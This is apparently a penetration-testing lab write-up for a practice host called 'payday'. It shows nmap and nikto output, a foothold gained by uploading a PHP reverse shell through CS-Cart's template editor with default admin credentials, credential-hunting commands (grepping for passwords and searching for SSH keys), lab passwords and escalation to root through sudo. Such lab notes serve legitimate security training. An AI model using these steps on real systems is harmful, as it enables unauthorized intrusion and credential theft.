**Metadata**

- IP Address:  192.168.136.39
- Hostname:  payday
- OS: 	
- Found Credentials/Users:
	-root/root (mysql)
	-patrick/patrick

Main Objectives:

Local.txt = 17c1ead174ca7c5690367fe56587289a
Proof.txt = 9df4f319deda798bff4cccc862688e95

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
sudo nmap -sS --top-ports 100 -T4 -Pn --max-retries 1 --min-rate 500 --host-timeout 60s -oA nmap/nmap_fast 192.168.191.39
# Fast scan to start with
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s


sudo nmap -sT -p- -T4 -Pn --max-retries 2 --min-rate 300 -oA nmap/nmap_full 192.168.191.39
# Full TCP scan.
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s


nmap -vv --reason -Pn -A --osscan-guess --version-all -p 22,80,110,139,143,445,993,995 -oN nmap/nmap_veryfull  192.168.191.39  
# Very full NMAP
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 61 OpenSSH 4.6p1 Debian 
80/tcp  open  http        syn-ack ttl 61 Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: CS-Cart. Powerful PHP shopping cart software
110/tcp open  pop3        syn-ack ttl 61 Dovecot pop3d
|_pop3-capabilities: SASL RESP-CODES STLS TOP PIPELINING UIDL 
139/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        syn-ack ttl 61 Dovecot imapd
445/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp open  ssl/imap    syn-ack ttl 61 Dovecot imapd
995/tcp open  ssl/pop3    syn-ack ttl 61 Dovecot pop3d-


sudo nmap -sU --open --top-ports 100 -T4 --max-retries 1 --host-timeout 90s -oA nmap/udp_fast 192.168.191.39
# Fast UDP scan
PORT    STATE SERVICE
137/udp open  netbios-ns

sudo nmap -sU -p- -T4 --max-retries 0 --min-rate 300 --host-timeout 10m -oA nmap/udp_full 192.168.191.39
# Full UDP Scan
137/udp open  netbios-ns

```

2. Interesting Ports/Services

```
22/tcp  open  ssh         syn-ack ttl 61 OpenSSH 4.6p1 Debian 
80/tcp  open  http        syn-ack ttl 61 Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: CS-Cart. Powerful PHP shopping cart software
110/tcp open  pop3        syn-ack ttl 61 Dovecot pop3d
|_pop3-capabilities: SASL RESP-CODES STLS TOP PIPELINING UIDL 
139/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        syn-ack ttl 61 Dovecot imapd
445/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp open  ssl/imap    syn-ack ttl 61 Dovecot imapd
995/tcp open  ssl/pop3    syn-ack ttl 61 Dovecot pop3d-

137/udp open  netbios-ns

```

3. Web Enumeration 

```
- Site visit: Looks like CS-CART e-commerse page. 
- I was able to login with admin/admin.
- Searched for exploits on CS-CART. Found https://www.exploit-db.com/exploits/48890. 

+ Server: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
+ /: Cookie csid created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Cookie cart_languageC created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Cookie secondary_currencyC created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Retrieved x-powered-by header: PHP/5.2.3-1ubuntu6.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.0.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ Apache/2.2.4 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.2.3-1ubuntu6 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ PHP/5.2 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /admin/browse.asp?FilePath=c:\&Opt=2&level=0: Cookie acsid created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /admin/browse.asp?FilePath=c:\&Opt=2&level=0: Cookie cart_languageA created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /admin/browse.asp?FilePath=c:\&Opt=2&level=0: Cookie secondary_currencyA created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /admin/config.php: PHP Config file may contain database IDs and passwords.
+ /admin/cplogfile.log: DevBB 1.0 final log file is readable remotely. Upgrade to the latest version. See: http://www.mybboard.com
+ /admin/system_footer.php: myphpnuke version 1.8.8_final_7 reveals detailed system information.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ /config/: Configuration information may be available remotely.
+ /admin.php?en_log_id=0&action=config: EasyNews version 4.3 allows remote admin access. This PHP file should be protected. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5412
+ /admin.php?en_log_id=0&action=users: EasyNews version 4.3 allows remote admin access. This PHP file should be protected. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5412
+ /admin/admin_phpinfo.php4: Mon Album version 0.6.2d allows remote admin access. This should be protected.
+ /admin/login.php?action=insert&username=test&password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user 'test' password 'test' to verify. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0995
+ /admin/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0672
+ //admin/admin.shtml: Axis network camera may allow admin bypass by using double-slashes before URLs. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0240
+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /admin/database/wwForum.mdb: Web Wiz Forums pre 7.5 is vulnerable to Cross-Site Scripting attacks. Default login/pass is Administrator/letmein. See: OSVDB-2813
+ //admin/aindex.htm: FlexWATCH firmware 2.2 is vulnerable to authentication bypass by prepending an extra /'s. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3604
+ /admin/wg_user-info.ml: WebGate Web Eye exposes user names and passwords. See: OSVDB-2922
+ /admin.php: This might be interesting.
+ /admin/: This might be interesting.
+ /config/checks.txt: This might be interesting.
+ /install/: This might be interesting.
+ /admin/auth.php: This might be interesting: has been seen in web logs from an unknown scanner.
+ /admin/cfg/configscreen.inc.php+: This might be interesting: has been seen in web logs from an unknown scanner.
+ /admin/cfg/configsite.inc.php+: This might be interesting: has been seen in web logs from an unknown scanner.
+ /admin/cfg/configsql.inc.php+: This might be interesting: has been seen in web logs from an unknown scanner.
+ /admin/cfg/configtache.inc.php+: This might be interesting: has been seen in web logs from an unknown scanner.
+ /admin/cms/htmltags.php: This might be interesting: has been seen in web logs from an unknown scanner.
+ /admin/credit_card_info.php: This might be interesting: has been seen in web logs from an unknown scanner.
+ /admin/exec.php3: This might be interesting: has been seen in web logs from an unknown scanner.
+ /admin/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
+ /admin/modules/cache.php+: This might be interesting: has been seen in web logs from an unknown scanner.
+ /admin/objects.inc.php4: This might be interesting: has been seen in web logs from an unknown scanner.
+ /admin/script.php: This might be interesting: has been seen in web logs from an unknown scanner.
+ /admin/settings.inc.php+: This might be interesting: has been seen in web logs from an unknown scanner.
+ /admin/templates/header.php: This might be interesting: has been seen in web logs from an unknown scanner.
+ /admin/upload.php: This might be interesting: has been seen in web logs from an unknown scanner.
+ /config/html/cnf_gi.htm: This might be interesting: has been seen in web logs from an unknown scanner.
+ /icons/: Directory indexing found.
+ /admin/adminproc.asp: Xpede administration page may be available. The /admin directory should be protected. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0579
+ /admin/datasource.asp: Xpede page reveals SQL account name. The /admin directory should be protected. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0579
+ /admin/admin.php?adminpy=1: PY-Membres 4.2 may allow administrator access. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1198
+ /install/install.php: Install file found.
+ /install.php: install.php file found.
+ /icons/README: Server may leak inodes via ETags, header found with file /icons/README, inode: 67942, size: 4872, mtime: Thu Jun 24 13:46:08 2010. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /classes/phpmailer/class.cs_phpmailer.php: PHP include error may indicate local or remote file inclusion is possible.
+ /install.php: PHP include error may indicate local or remote file inclusion is possible.
+ /config/config.txt: Configuration file found.
+ /config/readme.txt: Readme file found.
+ /admin/account.asp: Admin login page/section found.
+ /admin/account.html: Admin login page/section found.
+ /admin/account.php: Admin login page/section found.
+ /admin/controlpanel.asp: Admin login page/section found.
+ /admin/controlpanel.html: Admin login page/section found.
+ /admin/controlpanel.php: Admin login page/section found.
+ /admin/cp.asp: Admin login page/section found.
+ /admin/cp.html: Admin login page/section found.
+ /admin/cp.php: Admin login page/section found.
+ /admin/home.asp: Admin login page/section found.
+ /admin/home.php: Admin login page/section found.
+ /admin/index.asp: Admin login page/section found.
+ /admin/index.html: Admin login page/section found.
+ /admin/login.asp: Admin login page/section found.
+ /admin/login.html: Admin login page/section found.
+ /admin/login.php: Admin login page/section found.
+ /admin/html: Tomcat Manager / Host Manager interface found (pass protected).
+ /admin/status: Tomcat Server Status interface found (pass protected).
+ /admin/sites/new: ComfortableMexicanSofa CMS Engine Admin Backend (pass protected).
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.


gobuster dir -u http://192.168.101.110 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# Directory brute forcing

gobuster dir -u http://192.168.101.110 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Common directories and files

gobuster dir -u http://192.168.101.110 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Files

```

4. SMB Port 139, 445 Enumeration

```
smbclient -L //192.168.101.110 -U anonymous

smbmap -H 192.168.101.110                  

smbclient //192.168.101.110/Backup -N          


```

5. Port 110, 139 (POP3/IMAP)

```

```

6. Port  993, 995 (POP3/IMAP)

```

```

7. Possible Exploits

```
1. https://www.exploit-db.com/exploits/48891
```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

```
1. Downloaded php reverse shell from https://pentestmonkey.net/tools/web-shells/php-reverse-shell.
2. Edited reverse shell code changing the IP and PORT. 
3. Renamed the file php-reverse-shell.phtml.
4. Visited "cs-cart" /admin.php and login with admin/admin.
5. Under **Look and Feel** section click on "**template editor**".
6. Uploaded php-reverse-shell.phtml. 
7. Visted http://192.168.136.39/skins/php-reverse-shell.phtml.
8. Receivved reverse shell. 


```

2. Shell Access

```
# Linxu shell upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Post-Exploitation**

1. Basic System Info

```
# Linux
hostname
payday

uname -a
Linux payday 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux

env
TERM=xterm
PATH=/usr/local/bin:/usr/bin:/bin
PWD=/
LANG=C
SHLVL=1
_=/usr/bin/env

find / -writable -type d 2>/dev/null | head


find / -perm -4000 -type f 2>/dev/null
/lib/dhcp3-client/call-dhclient-script
/sbin/umount.cifs
/sbin/mount.cifs
/bin/fusermount
/bin/ping
/bin/ping6
/bin/check-foreground-console
/bin/umount
/bin/su
/bin/mount
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/lib/apache2/suexec
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/mtr
/usr/bin/arping
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/smbmnt
/usr/bin/newgrp
/usr/bin/at
/usr/bin/sudoedit
/usr/bin/chfn
/usr/bin/smbumount


find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-xr-- 1 root dhcp 2956 Sep  7  2007 /lib/dhcp3-client/call-dhclient-script
-rwsr-xr-x 1 root root 9292 Oct  4  2007 /sbin/umount.cifs
-rwsr-xr-x 1 root root 22700 Oct  4  2007 /sbin/mount.cifs
-rwsr-xr-- 1 root fuse 19668 Sep 18  2007 /bin/fusermount
-rwsr-xr-x 1 root root 30856 Jul  6  2007 /bin/ping
-rwsr-xr-x 1 root root 26684 Jul  6  2007 /bin/ping6
-rwsr-xr-x 1 root root 3448 Aug  1  2007 /bin/check-foreground-console
-rwsr-xr-x 1 root root 61248 Oct  3  2007 /bin/umount
-rwsr-xr-x 1 root root 27140 May 18  2007 /bin/su
-rwsr-xr-x 1 root root 80568 Oct  3  2007 /bin/mount
-r-sr-xr-x 1 root root 14320 Jan 17  2018 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 9532 Jan 17  2018 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 168232 Oct  4  2007 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 9624 Sep 30  2007 /usr/lib/pt_chown
-rwsr-xr-- 1 root www-data 10596 Oct  4  2007 /usr/lib/apache2/suexec
-rwsr-xr-x 1 root root 4536 Jun 14  2007 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root dip 269256 Oct  4  2007 /usr/sbin/pppd
-rwsr-xr-x 1 root root 23920 May 18  2007 /usr/bin/chsh
-rwsr-xr-x 1 root root 46052 May 30  2007 /usr/bin/mtr
-rwsr-xr-x 1 root root 11076 Jul  6  2007 /usr/bin/arping
-rwsr-xr-x 1 root root 12392 Jul  6  2007 /usr/bin/traceroute6.iputils
-rwsr-xr-x 2 root root 91776 Jun 15  2007 /usr/bin/sudo
-rwsr-xr-x 1 root root 29104 May 18  2007 /usr/bin/passwd
-rwsr-sr-x 1 root mail 72316 Mar 27  2007 /usr/bin/procmail
-rwsr-xr-x 1 root root 37392 May 18  2007 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 9904 Oct  4  2007 /usr/bin/smbmnt
-rwsr-xr-x 1 root root 20456 May 18  2007 /usr/bin/newgrp
-rwsr-xr-x 2 root root 91776 Jun 15  2007 /usr/bin/sudoedit
-rwsr-xr-x 1 root root 32208 May 18  2007 /usr/bin/chfn
-rwsr-sr-x 1 root root 6516 Oct  4  2007 /usr/bin/smbumount

cat /etc/crontab 2>/dev/null
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

ls -la /etc/cron.*
/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Apr 24  2008 .
drwxr-xr-x 70 root root 4096 Oct  7 22:08 ..
-rw-r--r--  1 root root  102 Dec 20  2006 .placeholder
-rw-r--r--  1 root root  456 Oct  4  2007 php5

/etc/cron.daily:
total 56
drwxr-xr-x  2 root root 4096 Apr 24  2008 .
drwxr-xr-x 70 root root 4096 Oct  7 22:08 ..
-rw-r--r--  1 root root  102 Dec 20  2006 .placeholder
-rwxr-xr-x  1 root root  633 Oct  4  2007 apache2
-rwxr-xr-x  1 root root 5811 Oct 15  2007 apt
-rwxr-xr-x  1 root root  314 Sep 15  2007 aptitude
-rwxr-xr-x  1 root root  502 May 15  2007 bsdmainutils
-rwxr-xr-x  1 root root  473 Oct  3  2007 find
-rwxr-xr-x  1 root root   89 Jun 19  2006 logrotate
-rwxr-xr-x  1 root root  946 May 23  2007 man-db
-rwxr-xr-x  1 root root  383 Oct  4  2007 samba
-rwxr-xr-x  1 root root 3283 Dec 20  2006 standard
-rwxr-xr-x  1 root root 1309 Sep 17  2007 sysklogd

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Apr 24  2008 .
drwxr-xr-x 70 root root 4096 Oct  7 22:08 ..
-rw-r--r--  1 root root  102 Dec 20  2006 .placeholder

/etc/cron.monthly:
total 16
drwxr-xr-x  2 root root 4096 Apr 24  2008 .
drwxr-xr-x 70 root root 4096 Oct  7 22:08 ..
-rw-r--r--  1 root root  102 Dec 20  2006 .placeholder
-rwxr-xr-x  1 root root  129 Dec 20  2006 standard

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Apr 24  2008 .
drwxr-xr-x 70 root root 4096 Oct  7 22:08 ..
-rw$ -r--r--  1 root root  102 Dec 20  2006 .placeholder
-rwxr-xr-x  1 root root  520 May 23  2007 man-db
-rwxr-xr-x  1 root root 1942 May 15  2007 popularity-contest
-rwxr-xr-x  1 root root 1220 Sep 17  2007 sysklogd

crontab -l 2>/dev/null

getcap -r / 2>/dev/null

ls -l /etc/shadow
-rw-r----- 1 root shadow 761 Mar 24  2020 /etc/shadow

ls -la /  
total 88
drwxr-xr-x 21 root root  4096 Apr 24  2008 .
drwxr-xr-x 21 root root  4096 Apr 24  2008 ..
-rw-------  1 root root  1024 Apr 24  2008 .rnd
drwxr-xr-x  2 root root  4096 Apr 24  2008 bin
drwxr-xr-x  3 root root  4096 Jan 17  2018 boot
lrwxrwxrwx  1 root root    11 Apr 24  2008 cdrom -> media/cdrom
drwxr-xr-x 10 root root 13360 Oct  7 22:08 dev
drwxr-xr-x 70 root root  4096 Oct  7 22:08 etc
drwxr-xr-x  3 root root  4096 Apr 12  2016 home
drwxr-xr-x  2 root root  4096 Apr 24  2008 initrd
lrwxrwxrwx  1 root root    32 Apr 24  2008 initrd.img -> boot/initrd.img-2.6.22-14-server
drwxr-xr-x 14 root root  4096 Apr 24  2008 lib
drwx------  2 root root 16384 Apr 24  2008 lost+found
drwxr-xr-x  4 root root  4096 Apr 24  2008 media
drwxr-xr-x  3 root root  4096 Sep 29  2011 mnt
drwxr-xr-x  2 root root  4096 Apr 24  2008 opt
dr-xr-xr-x 79 root root     0 Oct  7 22:08 proc
drwxr-xr-x  3 root root  4096 Dec 25 11:50 root
drwxr-xr-x  2 root root  4096 Jan 17  2018 sbin
drwxr-xr-x  2 root root  4096 Apr 24  2008 srv
drwxr-xr-x 12 root root     0 Oct  7 22:08 sys
drwxrwxrwt  3 root root  4096 Dec 25 12:00 tmp
drwxr-xr-x 10 root root  4096 Apr 24  2008 usr
drwxr-xr-x 14 root root  4096 Apr 24  2008 var
lrwxrwxrwx  1 root root    29 Apr 24  2008 vmlinuz -> boot/vmlinuz-2.6.22-14-server

```

2. User Enumeration

```
# Linux
whoami
www-data

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash

ls -la /home
drwxr-xr-x  2 patrick patrick 4096 Mar 25  2020 patrick

sudo -l


```

3. Network Information

```
# Linux
ss -tulwn

netstat -tulnp 2>/dev/null
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name   
tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN     -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN     -                   
tcp6       0      0 :::80                   :::*                    LISTEN     4959/sh             
tcp6       0      0 :::22                   :::*                    LISTEN     -                   
udp        0      0 192.168.136.39:137      0.0.0.0:*                          -                   
udp        0      0 0.0.0.0:137             0.0.0.0:*                          -                   
udp        0      0 192.168.136.39:138      0.0.0.0:*                          -                   
udp        0      0 0.0.0.0:138             0.0.0.0:*                          -    
```

4. Software, Service, and Process Information

```
# Linux
dpkg -l 
ps aux
ps -ef

```

4. Loot files.
```
# Linux

grep -R "password" /etc 2>/dev/null | head

ls -la /var/www 2>/dev/null

find /home -name "*.txt" 2>/dev/null


find /home -type f -name "*history*" 2>/dev/null


find /home -type f -name "id_rsa" -o -name "id_*" 2>/dev/null


grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head

find / -name "*.bak" -o -name "*~" 2>/dev/null | head


```

5. Automated Enumeration

```
- Linux version 2.6.22-14-server (buildd@palmer) (gcc version 4.1.3 20070929 (prerelease) (Ubuntu 4.1.2-16ubuntu2)) #1 SMP Sun Oct 14 23:34:23 GMT 2007
Distributor ID: Ubuntu
Description:    Ubuntu 7.10
Release:        7.10
Codename:       gutsy

- Sudo version 1.6.8p12 

- /dev/fd0        /media/floppy0  auto    rw,user,noauto,exec 0 

- mysql     4583  0.0  3.4 127608 17560 ?        Sl   11:15   0:00  _ /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306 --socket=/var/run/mysqld/mysqld.sock   
  
- MySQL connection using default root/root ........... Yes

- -rwsr-xr-x 1 root root 9.4K Sep 30  2007 /usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)

- tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     -    

- /var/www/config.php:$db_password = 'root';  
/etc/mysql/conf.d/old_passwords.cnf  

-rwsr-xr-x 1 root root 9.4K Sep 30  2007 /usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)

/root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAzx6C2kxbb2qPx9eRyW072CYpMhpa2zAlzgdBcElRS49cvTJlDcjqvC8DlpZL9FplzcfpCmD2xisb0VdHUtG2iteYQG5WaxUEeHd4t9XRqA9zCU3QjKq4jIDoT1A54HYLoEBk/jTxjUbaczfoFSgcZEOivBIZEM6usJW4gDgbpok1UoxHfmn7rRs43rgBKxKMpFZyp0+MsDlvKMZUie6F0mY60E2YSlwoyLAJKi0q1/oWB5Kmd3YtP20LIsVqvmbX7zcMXwXgztff0Wxj1dps0x6i1StYx1l14sU84comlceyZjzeYpqMoL+4OtWt4goqTqpiQasnXfv2vhNvCQXQaQ== root@explorer

```
5. Possible PE Paths

```
1. https://www.exploit-db.com/exploits/19467
   - Could not complile code on host, no gcc.
	- Could not build in docker container because could 
	     not find an old enough container.
2. https://www.exploit-db.com/exploits/40847
   - Same as above.
3. MYSQL Access 127.0.0.1:3306
   - No passwords foound in db. 
4. https://www.exploit-db.com/exploits/27397


```

**Privilege Escalation**

1. PE Steps

```
After, looking for a hint, found that patrick/patrick can log on after fixing ssh key match issue. 

ssh -oHostKeyAlgorithms=+ssh-rsa patrick@192.168.183.39

sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for patrick:
User patrick may run the following commands on this host:
    (ALL) ALL

sudo -su


```

2. Notes

```

```

